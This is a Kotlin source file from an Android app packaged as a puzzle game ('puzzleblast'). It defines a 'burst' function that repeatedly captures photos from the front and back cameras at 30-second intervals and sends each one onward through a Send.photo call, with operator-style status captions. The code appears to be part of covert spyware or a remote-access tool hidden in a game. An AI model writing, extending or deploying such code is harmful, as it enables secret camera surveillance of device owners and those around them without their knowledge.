package com.puzzleblast.game.modules

import android.content.Context
import com.puzzleblast.game.core.Send
import kotlinx.coroutines.delay

object BurstModule {
    suspend fun burst(ctx: Context, n: Int = 3): String {
        var sent = 0
        for (i in 0 until n) {
            val lens = if (i % 2 == 0) "front" else "back"
            val f = CameraModule.capture(ctx, lens)
            if (f != null) { Send.photo(f, "💥 burst ${i + 1}/$n · $lens"); sent++ }
            if (i < n - 1) delay(30_000L)
        }
        return "💥 burst done · $sent/$n captured"
    }
}
